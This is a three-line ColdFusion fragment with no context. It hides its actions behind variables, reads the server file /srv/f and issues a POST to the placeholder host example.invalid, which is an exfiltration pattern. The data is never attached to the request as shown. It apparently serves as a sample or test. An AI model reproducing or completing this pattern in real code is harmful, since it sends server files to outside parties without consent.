<cfset a="read"><cfset m="POST">
<cffile action="#a#" file="/srv/f" variable="data">
<cfhttp method="#m#" url="https://example.invalid/">
